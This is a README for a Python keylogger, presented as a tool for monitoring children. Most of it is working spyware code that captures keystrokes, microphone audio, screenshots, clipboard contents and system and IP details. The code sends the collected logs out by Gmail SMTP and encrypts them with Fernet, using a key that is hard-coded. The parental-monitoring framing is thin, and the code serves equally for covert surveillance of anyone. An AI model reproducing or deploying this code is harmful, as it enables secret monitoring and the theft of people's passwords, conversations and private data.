# Advanced_Keylogger
# AIM  
To track kids activity including keystrokes, audio, screenshots, clipboard data and System information

# COMPONENTS REQUIRED  
1. Pycharm IDE
2. Downloading necessary packages/libraries:
   * email
   * smtplib
   * socket
   * platform
   * win32clipboard
   * pynput
   * time
   * os
   * scipy
   * sounddevice
   * cryptography
   * requests
   * PIL
3. System with minimum 4GB RAM

# PROGRAM  

## Keylogger Functionality

    count = 0
    keys = []

    def on_press(key):
        global keys,count,currentTime

        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()

        if count >= 1: # to continously write keys to the log file
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key): # To exit the keylogger
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

  ## System Information Retrival

    def computer_information():
        with open(file_path + extend + system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)

            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")

    computer_information()

  ## Microphone Functionality

    def microphone():
      fs = 44100
      seconds = microphone_time
  
      myrecording = sd.rec(int(seconds * fs),samplerate=fs, channels=2)
      sd.wait()
  
      write(file_path + extend + audio_information,fs,myrecording)
  
    microphone()
  
  ## Screenshot Functionality

    def screenshot():
      im = ImageGrab.grab()
      im.save(file_path+  extend + screenshot_information)
  
    screenshot()

  ## Clipboard Functionality

    def copy_clipboard():
      with open(file_path + extend + clipboard_information, "a") as f:
          try:
              win32clipboard.OpenClipboard()
              pasted_data = win32clipboard.GetClipboardData()
              win32clipboard.CloseClipboard()
  
              f.write("Clipboard Data: \n" + pasted_data)
  
          except:
              f.write("Clipboard could be not be copied")
  
    copy_clipboard()
  
  
  ## Email Functionality

     def send_email(filename,attachment,toaddr):
  
      fromaddr = email_address
      msg = MIMEMultipart()
      msg['From'] = fromaddr
      msg['To'] = toaddr
      msg['Subject'] = "Log File"
      body = "body of the mail"
      msg.attach(MIMEText(body,'plain'))
  
      filename = filename
      attachment = open(attachment,'rb')
  
      p = MIMEBase('application','octet-stream')
      p.set_payload((attachment).read())
      encoders.encode_base64(p)
      p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  
      msg.attach(p)
  
      s = smtplib.SMTP('smtp.gmail.com',587)
      s.starttls()
      s.login(fromaddr,password)
      text = msg.as_string()
      s.sendmail(fromaddr,toaddr,text)
      s.quit()

 ## Generating Keys  

    from cryptography.fernet import Fernet
    
    key = Fernet.generate_key()
    file = open("encryption_key.txt","wb")
    file.write(key)
    file.close()

 ## Decrypting Files

    from cryptography.fernet import Fernet
    
    key ="3Qg7tgyEwaaCBXtE2DBVf3y2zH9BuRuBiWGloJTliMc="
    
    keys_information_e = "e_key_log.txt"
    system_information_e = "e_sys_info.txt"
    clipboard_information_e = "e_clipboard.txt"
    
    encrypted_files = [system_information_e,clipboard_information_e,keys_information_e]
    count = 0
    
    for decrypted_files in encrypted_files:
    
        with open(encrypted_files[count], 'rb') as f:
            data = f.read()
    
        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)
    
        with open(encrypted_files[count], 'wb') as f:
            f.write(decrypted)
    
        count += 1
